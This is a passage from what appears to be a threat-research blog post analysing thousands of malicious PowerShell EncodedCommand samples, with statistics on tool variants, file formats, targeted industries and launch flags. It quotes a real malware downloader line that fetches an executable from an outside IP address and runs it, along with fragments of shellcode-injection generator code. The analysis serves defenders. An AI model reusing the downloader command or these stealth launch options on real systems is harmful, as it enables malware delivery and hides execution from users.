class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-sy">$</span><span class="crayon-v">kuss</span><span class="crayon-sy">,</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-cn">0</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-st">for</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-sy">;</span><span class="crayon-sy">;</span><span class="crayon-sy">)</span><span class="crayon-sy">{</span><span class="crayon-v">Start</span><span class="crayon-o">-</span><span class="crayon-i">sleep</span><span class="crayon-h"> </span><span class="crayon-cn">60</span><span class="crayon-sy">}</span><span class="crayon-sy">;</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0011 seconds] -->
<p>In Magic Unicorn, there is a line within the generating script that randomizes some variables. Below is an excerpt showing how this works.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c944245548607" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea wrap="soft" class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
var1 = generate_random_string(3, 4)
var2 = generate_random_string(3, 4)

powershell_code = (
        r"""$1 = '$c = ''[DllImport("kernel32.dll")]public static extern IntPtr …

powershell_code = powershell_code.replace("$1", "$" + var1).replace("$c", "$" + var2).replace("$2", "$" + var3) …</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c944245548607-1">1</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c944245548607-2">2</div><div class="crayon-num" data-line="crayon-60a9b96a2c944245548607-3">3</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c944245548607-4">4</div><div class="crayon-num" data-line="crayon-60a9b96a2c944245548607-5">5</div><div class="crayon-num crayon-striped-num" data-line="crayon-60a9b96a2c944245548607-6">6</div><div class="crayon-num" data-line="crayon-60a9b96a2c944245548607-7">7</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c944245548607-1"><span class="crayon-v">var1</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">generate_random_string</span><span class="crayon-sy">(</span><span class="crayon-cn">3</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">4</span><span class="crayon-sy">)</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c944245548607-2"><span class="crayon-v">var2</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-e">generate_random_string</span><span class="crayon-sy">(</span><span class="crayon-cn">3</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">4</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60a9b96a2c944245548607-3">&nbsp;</div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c944245548607-4"><span class="crayon-v">powershell_code</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">(</span></div><div class="crayon-line" id="crayon-60a9b96a2c944245548607-5"><span class="crayon-h">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</span><span class="crayon-i">r</span><span class="crayon-s">""</span><span class="crayon-s">"$1 = '$c = ''[DllImport("</span><span class="crayon-v">kernel32</span><span class="crayon-sy">.</span><span class="crayon-i">dll</span><span class="crayon-s">")]public static extern IntPtr …</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a9b96a2c944245548607-6">&nbsp;</div><div class="crayon-line" id="crayon-60a9b96a2c944245548607-7"><span class="crayon-s">powershell_code = powershell_code.replace("</span><span class="crayon-sy">$</span><span class="crayon-cn">1</span><span class="crayon-s">", "</span><span class="crayon-sy">$</span><span class="crayon-s">" + var1).replace("</span><span class="crayon-sy">$</span><span class="crayon-i">c</span><span class="crayon-s">", "</span><span class="crayon-sy">$</span><span class="crayon-s">" + var2).replace("</span><span class="crayon-sy">$</span><span class="crayon-cn">2</span><span class="crayon-s">", "</span><span class="crayon-sy">$</span>"<span class="crayon-h"> </span><span class="crayon-o">+</span><span class="crayon-h"> </span><span class="crayon-v">var3</span><span class="crayon-sy">)</span><span class="crayon-h"> </span>…</div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0004 seconds] -->
<p>This simply replaces some variables with a string of 3-4 random alphanumeric characters; however, not all variables get replaced so the combination of the random string with known anchors allows me to theorize how it was generated. Alternatively, I can also see when it looks like this particular piece of code was copied into another tool without the randomization part of the Magic Unicorn script as the variables don’t change or was further built upon by adding additional randomization.</p>
<p>It’s not an exact science and, when dealing with code that has been heavily re-used over many years by many different people, you’re bound to run into scenarios where the code just doesn’t lend itself well to profiling. I’ve attempted to classify it as accurately as possible but a word of caution - take the specific names with a grain of salt throughout this analysis as nothing is stopping someone simply copying and pasting the code into their own tool.</p>
<p>In total, I profiled 27 clusters of public tools or capabilities, which had unique identifiers to separate them apart from the rest. I’ll get into each of them later as I catalog each variant but, for now, the below table offers a breakdown of the variants, how many samples matched, and the overall percentage it accounted for in the sample set.</p>
<p>&nbsp;</p>
<table width="100%">
<tbody>
<tr>
<td width="212"><strong>Variant</strong></td>
<td width="83"><strong>Count</strong></td>
<td width="148"><strong>% of Total</strong></td>
</tr>
<tr>
<td width="212">Downloader DFSP</td>
<td width="83">1,373</td>
<td width="148">33.49%</td>
</tr>
<tr>
<td width="212">Shellcode Inject</td>
<td width="83">1,147</td>
<td width="148">27.98%</td>
</tr>
<tr>
<td width="212">Unicorn</td>
<td width="83">611</td>
<td width="148">14.90%</td>
</tr>
<tr>
<td width="212">PowerShell Empire</td>
<td width="83">293</td>
<td width="148">7.15%</td>
</tr>
<tr>
<td width="212">SET</td>
<td width="83">199</td>
<td width="148">4.85%</td>
</tr>
<tr>
<td width="212">Unknown</td>
<td width="83">104</td>
<td width="148">2.54%</td>
</tr>
<tr>
<td width="212">Powerfun Reverse</td>
<td width="83">100</td>
<td width="148">2.44%</td>
</tr>
<tr>
<td width="212">Downloader DFSP 2X</td>
<td width="83">81</td>
<td width="148">1.98%</td>
</tr>
<tr>
<td width="212">Downloader DFSP DPL</td>
<td width="83">24</td>
<td width="148">0.59%</td>
</tr>
<tr>
<td width="212">Downloader IEXDS</td>
<td width="83">19</td>
<td width="148">0.46%</td>
</tr>
<tr>
<td width="212">PowerWorm</td>
<td width="83">19</td>
<td width="148">0.46%</td>
</tr>
<tr>
<td width="212">Unicorn Modified</td>
<td width="83">14</td>
<td width="148">0.34%</td>
</tr>
<tr>
<td width="212">Scheduled Task COM</td>
<td width="83">11</td>
<td width="148">0.27%</td>
</tr>
<tr>
<td width="212">BITSTransfer</td>
<td width="83">11</td>
<td width="148">0.27%</td>
</tr>
<tr>
<td width="212">VB Task</td>
<td width="83">10</td>
<td width="148">0.24%</td>
</tr>
<tr>
<td width="212">TXT C2</td>
<td width="83">10</td>
<td width="148">0.24%</td>
</tr>
<tr>
<td width="212">Downloader Proxy</td>
<td width="83">9</td>
<td width="148">0.22%</td>
</tr>
<tr>
<td width="212">AMSI Bypass</td>
<td width="83">8</td>
<td width="148">0.20%</td>
</tr>
<tr>
<td width="212">Veil Stream</td>
<td width="83">7</td>
<td width="148">0.17%</td>
</tr>
<tr>
<td width="212">Meterpreter RHTTP</td>
<td width="83">6</td>
<td width="148">0.15%</td>
</tr>
<tr>
<td width="212">DynAmite Launcher</td>
<td width="83">6</td>
<td width="148">0.15%</td>
</tr>
<tr>
<td width="212">Downloader Kraken</td>
<td width="83">5</td>
<td width="148">0.12%</td>
</tr>
<tr>
<td width="212">AppLocker Bypass</td>
<td width="83">4</td>
<td width="148">0.10%</td>
</tr>
<tr>
<td width="212">PowerSploit GTS</td>
<td width="83">3</td>
<td width="148">0.07%</td>
</tr>
<tr>
<td width="212">Powerfun Bind</td>
<td width="83">2</td>
<td width="148">0.05%</td>
</tr>
<tr>
<td width="212">Remove AV</td>
<td width="83">2</td>
<td width="148">0.05%</td>
</tr>
<tr>
<td width="212">DynAmite KL</td>
<td width="83">1</td>
<td width="148">0.02%</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>Over half of the samples analyzed utilized either a generic “DownloadFile-StartProcess” technique or a variant of the shellcode injection technique shown previously.</p>
<h3>General Distribution / Stats</h3>
<p>Across the 4,100 samples, there were 4 file formats seen.</p>
<table width="100%">
<tbody>
<tr>
<td width="148"><strong>File Format</strong></td>
<td width="148"><strong>Count</strong></td>
<td width="148"><strong>% of Total</strong></td>
</tr>
<tr>
<td width="148">"exe"</td>
<td width="148">2,154</td>
<td width="148">52.54%</td>
</tr>
<tr>
<td width="148">"doc"</td>
<td width="148">1,717</td>
<td width="148">41.88%</td>
</tr>
<tr>
<td width="148">"xls"</td>
<td width="148">228</td>
<td width="148">5.56%</td>
</tr>
<tr>
<td width="148">"dll"</td>
<td width="148">1</td>
<td width="148">0.02%</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p>EXE and DOC format account for the majority of extensions used across this sample set. Looking further at the DOC files, 77% of them, 1,326, matched the “Downloader DFSP” variant, which defines a generic downloader using the DownloadFile-StartProcess method as shown below.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c947976416935" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
			<div class="crayon-toolbar" data-settings=" mouseover overlay hide delay" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><span class="crayon-title"></span>
			<div class="crayon-tools" style="font-size: 12px !important;height: 18px !important; line-height: 18px !important;"><div class="crayon-button crayon-nums-button" title="Toggle Line Numbers"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-plain-button" title="Toggle Plain Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-wrap-button" title="Toggle Line Wrap"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-expand-button" title="Expand Code"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-copy-button" title="Copy"><div class="crayon-button-icon"></div></div><div class="crayon-button crayon-popup-button" title="Open Code In New Window"><div class="crayon-button-icon"></div></div></div></div>
			<div class="crayon-info" style="min-height: 16.8px !important; line-height: 16.8px !important;"></div>
			<div class="crayon-plain-wrap"><textarea  class="crayon-plain print-no" data-settings="dblclick" readonly style="-moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4; font-size: 12px !important; line-height: 15px !important;">
 (New-Object System.Net.WebClient).DownloadFile('http://94.102.53.238/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe");Start-Process ("$env:APPDATA\csrsv.exe")</textarea></div>
			<div class="crayon-main" style="">
				<table class="crayon-table">
					<tr class="crayon-row">
				<td class="crayon-nums " data-settings="show">
					<div class="crayon-nums-content" style="font-size: 12px !important; line-height: 15px !important;"><div class="crayon-num" data-line="crayon-60a9b96a2c947976416935-1">1</div></div>
				</td>
						<td class="crayon-code"><div class="crayon-pre" style="font-size: 12px !important; line-height: 15px !important; -moz-tab-size:4; -o-tab-size:4; -webkit-tab-size:4; tab-size:4;"><div class="crayon-line" id="crayon-60a9b96a2c947976416935-1"><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-r">New</span><span class="crayon-o">-</span><span class="crayon-t">Object</span><span class="crayon-h"> </span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Net</span><span class="crayon-sy">.</span><span class="crayon-v">WebClient</span><span class="crayon-sy">)</span><span class="crayon-sy">.</span><span class="crayon-e">DownloadFile</span><span class="crayon-sy">(</span><span class="crayon-s">'http://94.102.53.238/~yahoo/csrsv.exe'</span><span class="crayon-sy">,</span><span class="crayon-s">"$env:APPDATA\csrsv.exe"</span><span class="crayon-sy">)</span><span class="crayon-sy">;</span><span class="crayon-v">Start</span><span class="crayon-o">-</span><span class="crayon-e">Process</span><span class="crayon-h"> </span><span class="crayon-sy">(</span><span class="crayon-s">"$env:APPDATA\csrsv.exe"</span><span class="crayon-sy">)</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0002 seconds] -->
<p>Pivoting from there, 1,159 of the DOC files (87%) match known patterns for Cerber ransomware; the implication is that a tool is being used to generate the malicious Microsoft Word Documents that create the macro which launches PowerShell with this technique as the template.</p>
<p>The primary method of delivery across the DOC samples is SMTP/POP3, which aligns with the status quo of delivering ransomware by using malicious Microsoft Word Documents via e-mail campaigns.</p>
<p><img class="alignnone size-full wp-image-25143" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig1.png" alt="fig1" width="873" height="506" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig1.png 873w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig1-300x174.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig1-768x445.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig1-370x214.png 370w" sizes="(max-width: 873px) 100vw, 873px" /></p>
<p><em>Figure 1 Applications used to deliver malicious Powershell Word Documents</em></p>
<p>Looking at the target industries also shows a fairly even distribution throughout Higher Education, High Tech, Professional and Legal Services, and Healthcare.</p>
<p><img class="alignnone size-full wp-image-25149" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig2.png" alt="fig2" width="873" height="506" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig2.png 873w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig2-300x174.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig2-768x445.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig2-370x214.png 370w" sizes="(max-width: 873px) 100vw, 873px" /></p>
<p><em>Figure 2 Breakdown of Industries detecting malicious Powershell Word Documents</em></p>
<p>A quick look at the distribution over time also shows a number of large spikes that, again, aligns with the standard operating procedure of e-mail campaigns.</p>
<p><img class="alignnone size-full wp-image-25146" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig3.png" alt="fig3" width="521" height="431" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig3.png 521w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig3-300x248.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig3-370x306.png 370w" sizes="(max-width: 521px) 100vw, 521px" /></p>
<p><em>Figure 3 Number of malicious Powershell Word Documents captured in AutoFocus over the last 12 months</em></p>
<p>Looking at how the EXE samples were classified, nothing stands out as being dominant in terms of a group or malware family; however, interestingly enough there seems to be a preference for targeting companies in the High Tech industry.</p>
<p><img class="alignnone size-full wp-image-25170" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig4.png" alt="fig4" width="873" height="498" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig4.png 873w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig4-300x171.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig4-768x438.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig4-370x211.png 370w" sizes="(max-width: 873px) 100vw, 873px" /></p>
<p><em>Figure 4 Breakdown of Industries detecting malicious Executables using Powershell</em></p>
<p>The distribution over time is also fairly even in comparison to the DOC sample distribution over time.</p>
<p><img class="alignnone size-full wp-image-25152" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig5.png" alt="fig5" width="863" height="417" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig5.png 863w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig5-380x184.png 380w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig5-300x145.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig5-768x371.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2017/03/fig5-370x179.png 370w" sizes="(max-width: 863px) 100vw, 863px" /></p>
<p><em>Figure 5 Number of malicious Executables using Powershell captured in AutoFocus over the last 12 months</em></p>
<p>One possible explanation for this is a variation is distribution. For example, while DOC samples were primarily seen as attachments to e-mail, EXE samples were usually delivered through Web Browsing.</p>
<p>The last item I’ll touch on before diving into the commands themselves is the one DLL file that was detected using the EncodedCommand technique. This DLL contains no exports but when called with the DLLMain entry point will simply launch a PowerShell Empire stager which downloads an XOR’d script from a website and then uses PowerShell’s Invoke-Expression cmdlet to run the downloaded script. This sample was related to the <a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.Odinaff">Odinaff</a> family that Symantec <a href="http://www.symantec.com/connect/blogs/odinaff-new-trojan-used-high-level-financial-attacks">blogged</a> about in October 2016.</p>
<h3>Pre-Analysis Data / Stats</h3>
<p>Before looking at the base64 encoded data, I looked at how each process was launched. This frequency analysis and inspection gives some insight into what additional parameters are being used alongside EncodedCommand.</p>
<p><strong>EncodedCommand: (4,100 Samples – 100% Coverage)</strong></p>
<p>Used to pass a base64 encoded string to PowerShell for execution.</p>
<table width="100%">
<tbody>
<tr>
<td width="148"><strong>Flag</strong></td>
<td width="148"><strong>Count</strong></td>
<td width="148"><strong>% of Total</strong></td>
</tr>
<tr>
<td width="148">"-enc"</td>
<td width="148">3,407</td>
<td width="148">83.29%</td>
</tr>
<tr>
<td width="148">"-Enc"</td>
<td width="148">412</td>
<td width="148">10.05%</td>
</tr>
<tr>
<td width="148">"-EncodedCommand"</td>
<td width="148">229</td>
<td width="148">5.59%</td>
</tr>
<tr>
<td width="148">"-encodedcommand"</td>
<td width="148">40</td>
<td width="148">0.98%</td>
</tr>
<tr>
<td width="148">"-encodedCommand"</td>
<td width="148">7</td>
<td width="148">0.17%</td>
</tr>
<tr>
<td width="148">"-ec"</td>
<td width="148">3</td>
<td width="148">0.07%</td>
</tr>
<tr>
<td width="148">"-en"</td>
<td width="148">1</td>
<td width="148">0.02%</td>
</tr>
<tr>
<td width="148">"-ENC"</td>
<td width="148">1</td>
<td width="148">0.02%</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p><strong>WindowStyle Hidden: (2,083 Samples – 50.8% Coverage)</strong></p>
<p>Used to prevent PowerShell from displaying a window when it executes code. The most used variant “-window hidden” is due to the PowerShell command that the previously mentioned Microsoft Word Documents distributing Cerber are using.</p>
<table width="100%">
<tbody>
<tr>
<td width="148"><strong>Flag</strong></td>
<td width="148"><strong>Count</strong></td>
<td width="148"><strong>% of Total</strong></td>
</tr>
<tr>
<td width="148">"-window hidden"</td>
<td width="148">1,267</td>
<td width="148">30.90%</td>
</tr>
<tr>
<td width="148">"-W Hidden"</td>
<td width="148">315</td>
<td width="148">7.68%</td>
</tr>
<tr>
<td width="148">"-w hidden"</td>
<td width="148">159</td>
<td width="148">3.88%</td>
</tr>
<tr>
<td width="148">"-windowstyle hidden"</td>
<td width="148">125</td>
<td width="148">3.05%</td>
</tr>
<tr>
<td width="148">"-win hidden"</td>
<td width="148">67</td>
<td width="148">1.63%</td>
</tr>
<tr>
<td width="148">"-WindowStyle Hidden"</td>
<td width="148">45</td>
<td width="148">1.10%</td>
</tr>
<tr>
<td width="148">"-win Hidden"</td>
<td width="148">42</td>
<td width="148">1.02%</td>
</tr>
<tr>
<td width="148">"-wind hidden"</td>
<td width="148">40</td>
<td width="148">0.98%</td>
</tr>
<tr>
<td width="148">"-WindowStyle hidden"</td>
<td width="148">5</td>
<td width="148">0.12%</td>
</tr>
<tr>
<td width="148">"-WindowStyle hiddeN"</td>
<td width="148">5</td>
<td width="148">0.12%</td>
</tr>
<tr>
<td width="148">"-windows hidden"</td>
<td width="148">4</td>
<td width="148">0.10%</td>
</tr>
<tr>
<td width="148">"-Win Hidden"</td>
<td width="148">3</td>
<td width="148">0.07%</td>
</tr>
<tr>
<td width="148">"-win hid"</td>
<td width="148">2</td>
<td width="148">0.05%</td>
</tr>
<tr>
<td width="148">"-Window hidden"</td>
<td width="148">2</td>
<td width="148">0.05%</td>
</tr>
<tr>
<td width="148">"-Wind Hidden"</td>
<td width="148">1</td>
<td width="148">0.02%</td>
</tr>
<tr>
<td width="148">"-Win hidden"</td>
<td width="148">1</td>
<td width="148">0.02%</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p><strong>NonInteractive: (1,405 Samples – 42.4% Coverage)</strong></p>
<p>Used to prevent creating an interactive prompt for the user. Used in combination with WindowStyle Hidden to hide signs of execution. For the “-noni” variation, 76% were the generic shellcode injection code and SET, whereas “-NonI” was PowerShell Empire.</p>
<table width="100%">
<tbody>
<tr>
<td width="148"><strong>Flag</strong></td>
<td width="148"><strong>Count</strong></td>
<td width="148"><strong>% of Total</strong></td>
</tr>
<tr>
<td width="148">"-noni"</td>
<td width="148">1,042</td>
<td width="148">25.41%</td>
</tr>
<tr>
<td width="148">"-NonI"</td>
<td width="148">331</td>
<td width="148">8.07%</td>
</tr>
<tr>
<td width="148">"-noninteractive"</td>
<td width="148">27</td>
<td width="148">0.66%</td>
</tr>
<tr>
<td width="148">"-NonInteractive"</td>
<td width="148">4</td>
<td width="148">0.10%</td>
</tr>
<tr>
<td width="148">"-nonI"</td>
<td width="148">1</td>
<td width="148">0.02%</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p><strong>NoProfile: (1,350 Samples – 32.9% Coverage)</strong></p>
<p>Prevents PowerShell from loading profile scripts, which get executed on launch, so as to avoid potentially unwanted commands or settings. Similar to the breakdown for NonInteractive, “-nop” is primarily SET and the generic shellcode injection while “-NoP” is PowerShell Empire.</p>
<table>
<tbody>
<tr>
<td width="148"><strong>Flag</strong></td>
<td width="148"><strong>Count</strong></td>
<td width="148"><strong>% of Total</strong></td>
</tr>
<tr>
<td width="148">"-nop"</td>
<td width="148">955</td>
<td width="148">23.29%</td>
</tr>
<tr>
<td width="148">"-NoP"</td>
<td width="148">332</td>
<td width="148">8.10%</td>
</tr>
<tr>
<td width="148">"-noprofile"</td>
<td width="148">57</td>
<td width="148">1.39%</td>
</tr>
<tr>
<td width="148">"-NoProfile"</td>
<td width="148">5</td>
<td width="148">0.12%</td>
</tr>
<tr>
<td width="148">"-noP"</td>
<td width="148">1</td>
<td width="148">0.02%</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p><strong>ExecutionPolicy ByPass: (453 Samples – 11% Coverage)</strong></p>
<p>Bypasses the default PowerShell script execution policy (Restricted) and will not block the execution of any scripts or create any prompts. It’s interesting to note that the code executed within EncodedCommand parameter does not apply to the execution policy.</p>
<table width="100%">
<tbody>
<tr>
<td width="208"><strong>Flag</strong></td>
<td width="87"><strong>Count</strong></td>
<td width="148"><strong>% of Total</strong></td>
</tr>
<tr>
<td width="208">"-ep bypass"</td>
<td width="87">128</td>
<td width="148">3.12%</td>
</tr>
<tr>
<td width="208">"-exec bypass"</td>
<td width="87">80</td>
<td width="148">1.95%</td>
</tr>
<tr>
<td width="208">"-executionpolicy bypass"</td>
<td width="87">78</td>
<td width="148">1.90%</td>
</tr>
<tr>
<td width="208">"-Exec Bypass"</td>
<td width="87">73</td>
<td width="148">1.78%</td>
</tr>
<tr>
<td width="208">"-ExecutionPolicy ByPass"</td>
<td width="87">42</td>
<td width="148">1.02%</td>
</tr>
<tr>
<td width="208">"-ExecutionPolicy bypass"</td>
<td width="87">26</td>
<td width="148">0.63%</td>
</tr>
<tr>
<td width="208">"-Exec ByPass"</td>
<td width="87">9</td>
<td width="148">0.22%</td>
</tr>
<tr>
<td width="208">"-ExecutionPolicy Bypass"</td>
<td width="87">5</td>
<td width="148">0.12%</td>
</tr>
<tr>
<td width="208">"-ExecuTionPolicy ByPasS"</td>
<td width="87">4</td>
<td width="148">0.10%</td>
</tr>
<tr>
<td width="208">"-exe byPass"</td>
<td width="87">2</td>
<td width="148">0.05%</td>
</tr>
<tr>
<td width="208">"-ep Bypass"</td>
<td width="87">2</td>
<td width="148">0.05%</td>
</tr>
<tr>
<td width="208">"-ExecutionPolicy BypasS"</td>
<td width="87">2</td>
<td width="148">0.05%</td>
</tr>
<tr>
<td width="208">"-Exe ByPass"</td>
<td width="87">2</td>
<td width="148">0.05%</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p><strong>Sta: (219 Samples - 5.3% Coverage)</strong></p>
<p>Uses single-threaded apartment (now default as of PowerShell 3.0). This parameter was almost exclusively used in PowerShell Empire.</p>
<table width="100%">
<tbody>
<tr>
<td width="148"><strong>Flag</strong></td>
<td width="148"><strong>Count</strong></td>
<td width="148"><strong>% of Total</strong></td>
</tr>
<tr>
<td width="148">"-sta"</td>
<td width="148"> 219</td>
<td width="148"> 5.34%</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p><strong>NoExit: (23 Samples - 0.5% Coverage)</strong></p>
<p>Prevents PowerShell from exiting after running the startup commands. This was exclusively used by the PowerWorm malware and was the only parameter used beside EncodedCommand.</p>
<table width="100%">
<tbody>
<tr>
<td width="148"><strong>Flag</strong></td>
<td width="148"><strong>Count</strong></td>
<td width="148"><strong>% of Total</strong></td>
</tr>
<tr>
<td width="148">"-noexit"</td>
<td width="148"> 23</td>
<td width="148"> 0.56%</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p><strong>ExecutionPolicy Hidden (5 Samples - 0.12% Coverage)</strong></p>
<p>This actually isn’t a valid policy so PowerShell just ignores it. Every usage of it is related to a script I labeled “TXT C2”, which attempts to load a DNS TXT Record containing another PowerShell script, similar to PowerWorm. Most likely, the attacker meant to use ByPass here as they already have “-w hidden” later in their command.</p>
<table width="100%">
<tbody>
<tr>
<td width="148"><strong>Flag</strong></td>
<td width="148"><strong>Count</strong></td>
<td width="148"><strong>% of Total</strong></td>
</tr>
<tr>
<td width="148">"-ep hidden"</td>
<td width="148"> 5</td>
<td width="148"> 0.12%</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p><strong>NoLogo: (33 Samples - 0.8% Coverage)</strong></p>
<p>Hides the copyright banner when PowerShell launches.</p>
<table width="100%">
<tbody>
<tr>
<td width="148"><strong>Flag</strong></td>
<td width="148"><strong>Count</strong></td>
<td width="148"><strong>% of Total</strong></td>
</tr>
<tr>
<td width="148">"-Nol"</td>
<td width="148">10</td>
<td width="148">0.24%</td>
</tr>
<tr>
<td width="148">"-NoL"</td>
<td width="148">10</td>
<td width="148">0.24%</td>
</tr>
<tr>
<td width="148">"-nologo"</td>
<td width="148">9</td>
<td width="148">0.22%</td>
</tr>
<tr>
<td width="148">"-nol"</td>
<td width="148">4</td>
<td width="148">0.10%</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p><strong>ExecutionPolicy Unrestricted (1 Samples – 0.02% Coverage)</strong></p>
<p>Similar to ByPass, but will warn the user before running unsigned scripts downloaded from the Internet. The underlying lone script that used this parameter tries to execute a script downloaded from the Internet, which should generate a warning.</p>
<table width="100%">
<tbody>
<tr>
<td width="194"><strong>Flag</strong></td>
<td width="101"><strong>Count</strong></td>
<td width="148"><strong>% of Total</strong></td>
</tr>
<tr>
<td width="194">"-ExecutionPolicy Unrestricted"</td>
<td width="101"> 1</td>
<td width="148"> 0.02%</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
<p><strong>Command (1 Samples – 0.02% Coverage)</strong></p>
<p>Executes a command that follows the parameter as if they were typed at the PowerShell prompt. I only saw one instance of this and it was tied directly to a piece of malware that FireEye included in a <a href="https://www.fireeye.com/blog/threat-research/2016/04/ghosts_in_the_endpoi.html">blog</a> about evading signature-based detections. The PowerShell code is included in the “Comments” field of a DOCM file and launched from a macro inside a Microsoft Word document. Below is the code in question that chains together multiple commands to perform an FTP transfer and subsequent NetCat connection.</p><!-- Crayon Syntax Highlighter v_2.7.2_beta -->

		<div id="crayon-60a9b96a2c94d719688228" class="crayon-syntax crayon-theme-classic crayon-font-monaco crayon-os-pc print-yes notranslate" data-settings=" minimize scroll-mouseover wrap" style=" margin-top: 12px; margin-bottom: 12px; font-size: 12px !important; line-height: 15px !important;">
		
